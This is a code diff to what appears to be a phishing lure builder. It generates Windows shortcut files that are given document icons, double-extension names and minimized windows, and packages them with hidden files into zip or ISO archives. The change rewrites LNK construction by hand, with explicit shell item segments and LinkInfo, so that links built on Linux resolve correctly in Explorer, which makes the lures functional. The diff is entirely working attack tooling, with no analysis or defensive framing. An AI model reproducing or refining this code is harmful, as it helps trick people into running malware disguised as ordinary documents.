@@ -1,9 +1,11 @@
 import os
 import json
+import ntpath
 import shutil
 import tempfile
 import threading
 import zipfile
+from datetime import datetime
 
 import pycdlib
 import pylnk3
@@ -151,16 +153,59 @@ def _lnk_display_name(base, ext):
     return f'{base}.{ext}.lnk'
 
 
+def _lnk_segment(name, folder):
+    segment = pylnk3.PathSegmentEntry()
+    segment.type = pylnk3.TYPE_FOLDER if folder else pylnk3.TYPE_FILE
+    segment.file_size = 0
+    segment.short_name = name
+    segment.full_name = name
+    stamp = datetime(2020, 1, 1)
+    segment.created = segment.modified = segment.accessed = stamp
+    return segment
+
+
 def _write_lnk(lnk_path, target, arguments, ext):
+    """Write a LNK with an absolute shell item list that is valid on any host.
+
+    pylnk3.for_file() classifies path components with os.path.isdir(), so a
+    link built on Linux marks every directory as a FILE segment and leaves
+    LinkInfo empty; Explorer then cannot resolve the target at all. Build the
+    segments by name instead and add LinkInfo as a second resolution path.
+    """
     icon_file, icon_index = LNK_ICON_MAP.get(ext, LNK_ICON_MAP[DEFAULT_LURE_EXT])
-    pylnk3.for_file(
-        target,
-        lnk_path,
-        arguments=arguments,
-        icon_file=icon_file,
-        icon_index=icon_index,
-        window_mode=pylnk3.WINDOW_MINIMIZED,
-    )
+    drive, rest = ntpath.splitdrive(target)
+    names = [part for part in rest.split('\\') if part]
+    if not drive or not names:
+        raise ValueError(f'LNK target must be an absolute path: {target!r}')
+
+    lnk = pylnk3.create(lnk_path)
+    lnk.link_flags.IsUnicode = True
+    items = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
+             pylnk3.DriveEntry(drive + '\\')]
+    for name in names[:-1]:
+        items.append(_lnk_segment(name, True))
+    items.append(_lnk_segment(names[-1], False))
+    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
+    lnk.shell_item_id_list.items = items
+
+    info = lnk._link_info
+    info.local = 1
+    info.remote = 0
+    info.drive_type = pylnk3.DRIVE_FIXED
+    info.drive_serial = 0x1A2B3C4D
+    info.volume_label = ''
+    info.local_base_path = target
+    info.make_path()
+    lnk.link_flags.HasLinkInfo = True
+    lnk.link_flags.ForceNoLinkInfo = False
+
+    lnk.link_flags.HasArguments = True
+    lnk.arguments = arguments
+    lnk.link_flags.HasIconLocation = True
+    lnk.icon = icon_file
+    lnk.icon_index = icon_index
+    lnk.window_mode = pylnk3.WINDOW_MINIMIZED
+    lnk.save()
 
 
 def _add_hidden_file(zf, arcname, source_path):
